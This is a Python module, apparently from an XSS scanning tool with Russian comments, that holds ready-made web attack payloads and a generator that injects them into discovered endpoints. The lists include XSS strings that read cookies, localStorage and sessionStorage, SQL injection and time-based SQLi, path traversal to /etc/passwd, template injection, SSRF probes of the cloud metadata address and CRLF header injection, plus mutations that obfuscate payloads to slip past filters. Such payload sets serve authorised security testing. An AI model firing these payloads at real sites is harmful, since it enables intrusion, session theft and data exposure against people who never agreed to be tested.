# xss_security_gui/auto_recon/payloads.py

"""
Расширенные базы XSS и fuzz payloads + генератор для AutoRecon.
"""

from random import choice, randint
from typing import List, Dict, Any


# ============================================================
#  База XSS payloads
# ============================================================

XSS_PAYLOADS: List[str] = [
    # Базовые
    "<script>alert('XSS')</script>",
    "\"><svg/onload=alert(1)>",
    "<img src=x onerror=alert(document.domain)>",

    # DOM-based
    "<script>document.write(document.cookie)</script>",
    "<script>document.write(window.location)</script>",
    "<script>document.write(navigator.userAgent)</script>",
    "<script>document.write(JSON.stringify(localStorage))</script>",
    "<script>document.write(JSON.stringify(sessionStorage))</script>",
    "<script>document.write(document.domain)</script>",
    "<script>document.write(document.body.innerHTML.slice(0,200))</script>",
    "<script>document.write(document.documentElement.outerHTML.slice(0,200))</script>",

    # SVG / MathML
    "<svg/onload=alert(1)>",
    "<math><mtext></mtext><script>alert(1)</script>",

    # Event handlers
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<video src=x onerror=alert(1)>",

    # Encoded
    "%3Cscript%3Ealert(1)%3C/script%3E",

    # Polyglots
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=prompt(1)>",
    "<svg/onload=confirm(1)>",

    # Cookie reflection
    "<img src=x onerror=this.src='/?c='+document.cookie>",
]


# ============================================================
#  База fuzz payloads
# ============================================================

FUZZ_PAYLOADS: List[str] = [
    # SQLi
    "' OR 1=1 --",
    "\" OR \"\"=\"",
    "' UNION SELECT NULL --",
    "' AND SLEEP(3) --",
    "'; WAITFOR DELAY '0:0:3' --",

    # Path Traversal
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "../../../../../../boot.ini",

    # Template Injection
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",

    # SSRF
    "http://127.0.0.1",
    "http://localhost:80",
    "http://169.254.169.254/latest/meta-data/",

    # CRLF Injection
    "test%0d%0aSet-Cookie:crlf=1",
    "%0d%0aX-Injection:1",

    # JSON breakers
    "\"}}]; alert(1); //",
    "]}'; alert(1); //",

    # XSS polyglots
    "\"><script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",

    # Cookie reflection
    "{{document.cookie}}",
    "${document.cookie}",
    "'+document.cookie+'",

    # localStorage / sessionStorage
    "{{localStorage}}",
    "${localStorage}",
    "'+JSON.stringify(localStorage)+'",

    "{{sessionStorage}}",
    "${sessionStorage}",
    "'+JSON.stringify(sessionStorage)+'",

    # window.location
    "{{window.location}}",
    "${window.location}",
    "'+window.location+'",

    # navigator
    "{{navigator.userAgent}}",
    "${navigator.userAgent}",
    "'+navigator.userAgent+'",

    # DOM
    "{{document.body.innerText}}",
    "${document.body.innerText}",
    "'+document.body.innerText+'",
]


# ============================================================
#  Публичные API-функции
# ============================================================

def generate_xss_payloads() -> List[str]:
    """Возвращает копию расширенного набора XSS payloads."""
    return XSS_PAYLOADS.copy()


def generate_fuzz_payloads() -> List[str]:
    """Возвращает копию расширенного набора fuzz payloads."""
    return FUZZ_PAYLOADS.copy()


# ============================================================
#  Генератор payloads для AutoRecon
# ============================================================

class PayloadGenerator:
    """
    Генератор payload'ов для AutoRecon:
    • выбирает preset
    • мутирует payload при необходимости
    • создаёт GET/POST запросы для всех эндпоинтов
    """

    def __init__(
        self,
        endpoints: List[Dict[str, Any]],
        use_mutation: bool = True,
        preset: str | None = None,
    ):
        self.endpoints = endpoints
        self.use_mutation = use_mutation
        self.preset = preset or choice(XSS_PAYLOADS)

    # --------------------------------------------------------

    def generate(self) -> List[Dict[str, Any]]:
        """Генерирует GET/POST payloads для всех endpoints."""
        results = []

        for ep in self.endpoints:
            method = ep.get("method", "GET")
            params = ep.get("params", [])

            payload = (
                self.mutate_payload(self.preset)
                if self.use_mutation
                else self.preset
            )

            if method == "GET":
                query = "&".join(f"{k}={payload}" for k in params)
                results.append({
                    "method": "GET",
                    "url": f"{ep['url']}?{query}",
                    "source": ep.get("source", "unknown"),
                })

            elif method == "POST":
                body = {k: payload for k in params}
                results.append({
                    "method": "POST",
                    "url": ep["url"],
                    "json": body,
                    "source": ep.get("source", "unknown"),
                })

        return results

    # --------------------------------------------------------

    def mutate_payload(self, base: str) -> str:
        """Создаёт случайную мутацию XSS payload."""
        variants = [
            base.replace("<", "%3C").replace(">", "%3E"),
            base.replace("alert", "confirm"),
            base.replace("script", "sCrIpT"),
            base + f"<!--{randint(100, 999)}-->",
            base.replace("1", str(randint(2, 9))),
            base.replace("XSS", f"X{randint(100, 999)}"),
            base.replace("document.cookie", "document.domain"),
            base.replace("document.cookie", "navigator.userAgent"),
            base.replace("document.cookie", "window.location.href"),
        ]
        return choice(variants)


# ============================================================
#  Публичный API модуля
# ============================================================

__all__ = [
    "XSS_PAYLOADS",
    "FUZZ_PAYLOADS",
    "generate_xss_payloads",
    "generate_fuzz_payloads",
    "PayloadGenerator",
]